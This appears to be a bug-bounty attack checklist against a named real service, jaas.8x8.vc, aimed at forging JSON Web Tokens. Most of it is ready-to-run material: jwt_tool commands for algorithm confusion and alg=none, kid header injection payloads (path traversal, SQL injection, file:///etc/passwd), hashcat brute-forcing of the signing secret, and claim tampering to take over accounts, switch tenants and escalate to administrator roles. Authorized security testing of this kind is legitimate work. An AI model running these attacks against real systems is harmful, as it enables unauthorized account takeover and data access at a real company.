# JWT attack matrix for jaas.8x8.vc

## Tokens observed
- **Auth0 passcode token** (HS256, claims include `cid`, `role`, `tenant`, `email_verified`, `aud`, `iss=oauth-login.8x8`)
- **Invite JWT** (RS256, `kid: meetings/prod-2022-09-01`, `sub` = ~64 hex (sha256 of email?))
- **`/token-mapping/v1/jaas-system-token/token`** — issues internal token
- **`/token-mapping/v1/jaas-public/token`** — issues public token

## Get the public key
Try in this order:
1. `https://jaas.8x8.vc/.well-known/jwks.json`
2. `https://jaas.8x8.vc/meet-external/.well-known/jwks.json`
3. `https://oauth-login.8x8.com/.well-known/jwks.json`
4. `https://api-vo.jitsi.net/.well-known/jwks.json`
5. `https://meet-config.jitsi.net/.well-known/jwks.json`
6. Search jitsi GitHub for `prod-2022-09-01` → likely public somewhere.

Save as `pubkey.pem`.

## Attacks

### 1. Algorithm confusion — RS256 → HS256 (the big one)
If the verifier blindly trusts the alg header and uses the same key:

```bash
# clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py "$INVITE_JWT" -X k -pk pubkey.pem
# this re-signs the token as HS256 using the public key as the HMAC secret
# replace your invite_id query param with the new token, observe response
```

If accepted → you can forge invite_ids for any email → ATO-via-invite. P1 territory.

### 2. alg=none
```bash
python3 jwt_tool.py "$TOKEN" -X a
```

### 3. kid path traversal / SQLi / null
The invite token has `"kid":"meetings/prod-2022-09-01"`. If the server resolves the kid via filesystem or DB lookup:
```
"kid":"../../../../dev/null"          → forces empty key, then HS256 with "" 
"kid":"' UNION SELECT 'attackerkey'-- "
"kid":"file:///etc/passwd"
```
`jwt_tool.py -X i` automates many of these.

### 4. JKU / X5U injection
If headers contain `jku` or `x5u`, point to attacker host.

### 5. HS256 secret bruteforce
The Auth0 passcode token is HS256. Auth0 secrets are normally strong, but:
```bash
hashcat -m 16500 token.txt rockyou.txt
hashcat -m 16500 token.txt -a 3 ?a?a?a?a?a?a?a?a
```
Run for an hour; if it cracks, every passcode token is forgeable.

### 6. Claim tampering tests (re-sign with cracked key, or test if signature is even validated)
- `https://8x8.vc/cid` → another tenant's cid
- `https://8x8.vc/role` → `OWNER`, `SUPERADMIN`, `*`
- `https://8x8.vc/tenant` → another tenant
- `https://8x8.vc/email_verified` → `true`
- `aud` → other clientIds
- `iss` → spoofed
- Add `https://8x8.vc/impersonate` boolean

### 7. Cross-environment confusion
Tokens have `environment=prod-8x8`. Try `dev-8x8`, `staging-8x8`, `test-8x8` in jitsi-versioning/* — sometimes auth is laxer in non-prod paths exposed in prod.

## What to report
- Any 200 from a forged token → P1
- Any 200 from email-mismatch on invite → P2-P3
- email_verified=false but billing actions succeed → P3-P4
- Reserved tenant (`quicksight`) returns sensitive config → P2-P3
